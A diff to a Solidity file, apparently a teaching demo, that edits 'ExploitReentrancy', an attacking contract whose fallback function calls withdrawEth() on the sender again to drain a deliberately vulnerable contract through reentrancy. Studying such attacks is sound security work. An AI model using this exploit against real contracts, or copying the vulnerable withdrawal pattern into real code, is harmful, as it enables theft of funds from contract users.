@@ -21,14 +21,19 @@ contract ReentrancyVuln {
 
 contract ExploitReentrancy {
 
-    uint times_to_reenter = 0;
+    uint public times_to_reenter;
 
     function withdrawEthFromVulnContract(address reentrant_contract) public {
         (bool success, ) = reentrant_contract.call(abi.encodeWithSignature("withdrawEth()"));
         // require(success);
     }
+
+    function printBalance() public {
+        console.log(address(this).balance);
+    }
     fallback() external payable {
-        console.log("Fallback invoked balance of contract is now:", address(this).balance / 1e18, "Ether");
-        (bool success,) = msg.sender.call(abi.encodeWithSignature("withdrawEth()"));
+        console.log("Fallback invoked, balance of contract is now:", address(this).balance / 1e18, "Ether");
+        (bool success,) = msg.sender.call(abi.encodeWithSignature("withdrawEth()"));    
+
     }
 }
